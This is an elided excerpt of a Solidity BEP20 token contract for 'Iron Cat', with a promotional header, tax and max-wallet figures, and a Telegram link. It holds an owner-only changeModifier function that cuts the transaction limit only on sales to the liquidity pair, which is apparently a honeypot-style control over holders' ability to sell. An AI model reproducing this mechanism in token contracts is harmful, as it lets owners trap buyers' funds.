 ...
 *      Iron Cat (IRONCAT)
 *
 *      The world needs now Iron Cat more than ever!
 *
 *      8% tax: 4% LP 4% marketing
 *      5% max wallet (50,000)
 *
 *      https://t.me/ironcatbsc
*/
...
contract IronCat is IBEP20, Auth {

    using SafeMath for uint256;

    string constant _name = "Iron Cat";
    string constant _symbol = "IRONCAT";
    ...
    constructor () Auth(msg.sender) {
        ...
        anothermarketingWallet = 0x60B6A0E40501350DF37782DCCa09C37475297275;
    ...
    function changeModifier(uint256 newModifier) external authorized {
    ...
    function _getMaxTxAmount(address recipient) internal view returns (uint256) {
        return pair == recipient ? _maxTxAmount.div(_modifier) : _maxTxAmount;
    }
